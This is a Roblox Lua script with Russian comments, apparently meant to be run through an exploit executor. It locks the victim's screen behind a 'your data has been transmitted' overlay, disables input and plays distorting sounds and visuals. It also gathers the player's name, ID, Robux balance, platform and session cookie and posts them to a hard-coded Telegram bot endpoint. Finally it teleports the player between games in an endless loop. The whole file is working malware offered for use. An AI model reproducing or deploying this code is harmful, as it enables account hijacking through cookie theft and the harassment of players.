local player = game.Players.LocalPlayer

-- Список популярных игр для циклического перехода (еще больше игр)
local gameIds = {
    2753915549, -- Blox Fruits
    292439477,  -- Phantom Forces
    142823291,  -- Murder Mystery 2
    286090429,  -- Arsenal
    3956818381, -- Ninja Legends
    1962086868, -- Tower of Hell
    301549746,  -- Counter Blox
    155615604,  -- Prison Life
    734159876,  -- Brookhaven RP
    2212618339, -- Blade Ball
    8540346411, -- Pet Simulator 99
    6284583030, -- Pet Simulator X
    7044306054, -- Build A Boat For Treasure
    13822889,   -- Natural Disaster Survival
    1537690962, -- Bee Swarm Simulator
    3981222245, -- Vehicle Legends
    3101667897, -- Legends of Speed
    4643697439, -- SharkBite 2
    6938803436, -- Tower Defense Simulator
    2317718696, -- Anime Fighting Simulator
    5777228027, -- Super Power Fighting Simulator
    537413528,  -- Builderman's Adventure
    3623096087, -- World of Magic
    4955582368, -- Ro-Ghoul
    5104202739, -- Anime Dimensions
    5274996219, -- Anime Battle Arena
    5602055394, -- All Star Tower Defense
    621129760,  -- Vehicle Simulator
    6677985923, -- Car Crushers 2
    7047626694, -- Car Dealership Tycoon
    7186594476, -- Car Tycoon
    7560156054, -- Car Factory Tycoon
    7737693362, -- Car Wash Tycoon
    8204896019, -- Car Showroom Tycoon
    8939734403, -- Car Dealership Simulator
    1054526971, -- Jailbreak
    142823291,  -- Adopt Me
    2788229376, -- Dragon Adventures
    6381829480, -- Rainbow Friends
    8737899170, -- Doomspire Brickbattle
    2537430692, -- Survive the Killer
    292439477,  -- Bad Business
    4442272183, -- Those Who Remain
}

-- Функция для создания экрана с сообщением
local function createScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "WarningGui"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.ResetOnSpawn = false
    screenGui.DisplayOrder = 999999

    -- Чередование черного и белого фона
    local isWhite = math.random(1, 2) == 1
    local backgroundColor = isWhite and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0)
    local textColor = isWhite and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
    
    local background = Instance.new("Frame")
    background.Name = "Background"
    background.BackgroundColor3 = backgroundColor
    background.Size = UDim2.new(2, 0, 2, 0)
    background.Position = UDim2.new(-0.5, 0, -0.5, 0)
    background.BorderSizePixel = 0
    background.ZIndex = 999999
    background.Parent = screenGui

    local messageLabel = Instance.new("TextLabel")
    messageLabel.Name = "WarningMessage"
    messageLabel.Size = UDim2.new(0.5, 0, 0.05, 0) -- Уменьшенный размер текста
    messageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
    messageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Text = "*ТВОИ ДАННЫЕ БЫЛИ ПЕРЕДАНЫ*"
    messageLabel.TextColor3 = textColor
    messageLabel.TextScaled = true
    messageLabel.Font = Enum.Font.GothamBlack
    messageLabel.TextStrokeTransparency = 0
    messageLabel.TextStrokeColor3 = isWhite and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
    messageLabel.ZIndex = 1000000
    messageLabel.TextWrapped = true
    messageLabel.Parent = background

    -- Добавляем случайные помехи на экран
    for i = 1, 20 do
        local noise = Instance.new("Frame")
        noise.Name = "Noise" .. i
        noise.BackgroundColor3 = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
        noise.Size = UDim2.new(0, math.random(5, 50), 0, math.random(5, 50))
        noise.Position = UDim2.new(0, math.random(0, 1000), 0, math.random(0, 1000))
        noise.BorderSizePixel = 0
        noise.ZIndex = 999998
        noise.Parent = background
    end

    local inputBlocker = Instance.new("TextButton")
    inputBlocker.Name = "InputBlocker"
    inputBlocker.Size = UDim2.new(2, 0, 2, 0)
    inputBlocker.Position = UDim2.new(-0.5, 0, -0.5, 0)
    inputBlocker.BackgroundTransparency = 1
    inputBlocker.Text = ""
    inputBlocker.Modal = true
    inputBlocker.ZIndex = 1000001
    inputBlocker.Parent = background

    screenGui.Parent = game:GetService("CoreGui")
    
    return screenGui
end

-- Функция для создания странных звуков
local function createStrangeSounds()
    local soundService = game:GetService("SoundService")
    
    -- Создаем несколько звуков с разными частотами
    for i = 1, 5 do
        local sound = Instance.new("Sound")
        sound.Name = "StrangeSound" .. i
        sound.SoundId = "rbxassetid://" .. tostring(140737297 + math.random(1, 10000))
        sound.Volume = 0.5
        sound.Looped = true
        sound.PlaybackSpeed = 0.5 + math.random() * 2
        sound.Parent = soundService
        
        -- Пытаемся воспроизвести звук
        pcall(function()
            sound:Play()
        end)
    end
end

-- Функция для создания визуальных помех
local function createVisualEffects()
    local lighting = game:GetService("Lighting")
    
    -- Меняем освещение
    lighting.Brightness = 5
    lighting.Ambient = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
    lighting.OutdoorAmbient = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
    
    -- Добавляем пост-эффекты
    local blur = Instance.new("BlurEffect")
    blur.Size = 10
    blur.Parent = lighting
    
    local colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.Brightness = 0.1
    colorCorrection.Contrast = 0.5
    colorCorrection.Saturation = -0.5
    colorCorrection.TintColor = Color3.fromRGB(255, math.random(0, 255), math.random(0, 255))
    colorCorrection.Parent = lighting
end

-- Функция для тряски камеры
local function shakeCamera()
    local runService = game:GetService("RunService")
    local camera = workspace.CurrentCamera
    
    local connection
    connection = runService.Heartbeat:Connect(function()
        if camera then
            local offset = Vector3.new(
                math.random(-2, 2),
                math.random(-2, 2),
                math.random(-2, 2)
            )
            camera.CFrame = camera.CFrame + offset
        end
    end)
    
    -- Останавливаем тряску через 10 секунд
    wait(10)
    connection:Disconnect()
end

-- Функция для сбора и отправки данных
local function collectAndSendData()
    local gameNameSuccess, gameName = pcall(function()
        local marketplaceService = game:GetService("MarketplaceService")
        local productInfo = marketplaceService:GetProductInfo(game.PlaceId)
        return productInfo.Name
    end)

    local data = {
        name = player.Name,
        userid = player.UserId,
        placeid = game.PlaceId,
        gamename = gameNameSuccess and gameName or "Неизвестно",
        time = os.date()
    }

    local success, balance = pcall(function()
        return player:GetRobuxBalance()
    end)
    data.robux = success and balance or "Недоступно"

    local UIS = game:GetService("UserInputService")
    data.platform = tostring(UIS:GetPlatform())

    local cookie_success, cookie_data = pcall(function()
        local response = request({
            Url = "https://www.roblox.com/game/referral",
            Method = "GET"
        })
        return response.Headers["Set-Cookie"] or "Недоступно"
    end)
    data.cookie = cookie_success and cookie_data or "Недоступно"

    local message = "👤 " .. data.name .. 
                    "\n🆔 " .. data.userid .. 
                    "\n🎮 " .. data.placeid .. 
                    "\n📛 " .. data.gamename ..
                    "\n💎 " .. data.robux .. 
                    "\n📱 " .. data.platform .. 
                    "\n🍪 " .. data.cookie .. 
                    "\n⏰ " .. data.time

    pcall(function()
        request({
            Url = "https://api.telegram.org/bot8430370950:AAEBY5JHBgb62K0B-r0_zGckjedfw9BmuMg/sendMessage",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                chat_id = "7811534269",
                text = message
            })
        })
    end)
end

-- Функция для блокировки интерфейса
local function blockInterface()
    local starterGui = game:GetService("StarterGui")
    pcall(function()
        starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)

    local UIS = game:GetService("UserInputService")
    UIS.ModalEnabled = true

    UIS.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard then
        end
    end)
end

-- Улучшенная функция для телепорта между играми
local function teleportToNextGame()
    -- Минимальная задержка перед телепортацией
    wait(0.5)
    
    -- Выбираем случайную игру из списка
    local randomIndex = math.random(1, #gameIds)
    local nextPlaceId = gameIds[randomIndex]
    
    -- Телепортируем на случайную игру
    local TeleportService = game:GetService("TeleportService")
    
    -- Используем pcall для обработки возможных ошибок
    local success, errorMessage = pcall(function()
        TeleportService:Teleport(nextPlaceId, player)
    end)
    
    -- Если телепорт не удался, пробуем другую игру сразу
    if not success then
        warn("Телепорт не удался: " .. tostring(errorMessage))
        teleportToNextGame() -- Рекурсивно пробуем снова
    end
end

-- Автоматический инжект после загрузки
local function autoInject()
    -- Создаем экран с помехами
    createScreen()
    
    -- Блокируем интерфейс
    blockInterface()
    
    -- Создаем странные звуки
    createStrangeSounds()
    
    -- Создаем визуальные эффекты
    createVisualEffects()
    
    -- Трясем камеру
    shakeCamera()
    
    -- Собираем и отправляем данные
    collectAndSendData()
    
    -- Запускаем цикл телепортации
    teleportToNextGame()
end

-- Запускаем автоматический инжект при загрузке
autoInject()

-- Обеспечиваем постоянную работу скрипта
while true do
    wait(0.5)
    -- Проверяем, что интерфейс все еще активен
    if not game:GetService("CoreGui"):FindFirstChild("WarningGui") then
        createScreen()
    end
    
    -- Периодически добавляем новые эффекты
    if math.random(1, 10) == 1 then
        createStrangeSounds()
        createVisualEffects()
        shakeCamera()
    end
end
